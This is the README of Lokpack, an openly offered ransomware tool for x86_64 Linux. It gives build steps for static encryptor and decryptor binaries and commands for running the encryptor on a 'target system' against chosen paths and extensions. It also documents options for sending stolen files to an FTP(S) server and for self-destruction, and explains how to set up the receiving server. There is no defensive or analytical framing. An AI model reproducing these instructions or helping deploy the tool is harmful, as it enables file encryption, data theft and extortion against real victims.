# Lokpack | Ransomware tooling for x84_64 Linux
Lokpack is a free (as in freedom) and open source ransomware 
tool targeting x86_64 Linux systems, written in C.

![showcase](https://github.com/ngn13/lokpack/assets/78868991/d1d8e490-b7d3-4f21-aeca-368eb0a0a0d8)

## Features
- Build static encryption and decrypiton tools
- Steal files using a FTP(S) server
- Specify custom target paths
- Uncrackable RSA asymmetric encryption
- Multi-threaded (a.k.a. fast)

## Installation

### Binary builds
You can download the latest release archive, which contains a static build
of the encryptor and the decryptor, **without SSL/TLS** support. After downloading
and extracting the archive, run the `patch.py` script to replace the private/public keys:
```bash
# make sure you have pycryptodome installed
python3 patch.py
```

### From the source
Required libraries/tools are:
- A (x86_64) Linux system
- gcc and other build tools
- curl (and headers)
- openssl (and headers)

> [!WARNING]
> Do NOT build from the latest commit, check out the latest tag
> or download the [latest release](https://github.com/ngn13/lokpack/releases).

To generate static builds, you will need static libraries of curl and openssl,
**if your distro does not package these**, you can build them yourself or use the automated
build scripts:
```bash
./scripts/openssl.sh
./scripts/curl.sh
```
**Note that automated script for curl does not support SSL/TLS connections**.

After building the static libraries, use the build script to create build with a random key:
```bash
./scripts/build.sh -static
```
This should create the `encryptor` and the `decryptor` binares at `dist/`.

## Usage
After transfering `encryptor` to the target system, you can specify custom options:
```bash
$ ./encryptor --help
[*] Listing available options:
    --threads  => Thread count for the thread pool
    --paths    => Paths to look for files
    --exts     => Valid extensions for files
    --ftp-url  => Address for the FTP(S) server
    --ftp-user => FTP(S) username
    --ftp-pwd  => FTP(S) password
    --no-ftp   => Disable stealing files with FTP(S)
    --destruct => Self destruct the program
```

For example to encrypt `.sql` and `.db` files located at `/var` and `/home` without FTP using 100 threads:
```bash
./encryptor --threads=100 --paths=/var,/home --exts=sql,db --no-ftp
```
If you want to encrypt all files with all extensions, set `--exts` to `ALL`.

Decryptor does not have any options, but can specify the target directory, by default it searches the entire file system (`/`):
```bash
./decryptor /var
```

### Setting up FTP(S)
For an actual FTP(S) setup you should install a FTP daemon such as `vsftpd` or `bftpd`. But for testing you can 
use `pyftpdlib`:
```bash
# username and password are 'anonymous' 
# which is default for the encryptor
python3 -m pyftpdlib -w
# -w for write access
```

## Resources
- [C-Thread-Pool](https://github.com/Pithikos/C-Thread-Pool)
- [CURL ftpupload](https://curl.se/libcurl/c/ftpupload.html)
- [CURL options](https://curl.se/libcurl/c/easy_setopt_options.html)
- [OpenSSL RSA Demo](https://github.com/openssl/openssl/blob/master/demos/encrypt/rsa_encrypt.c)
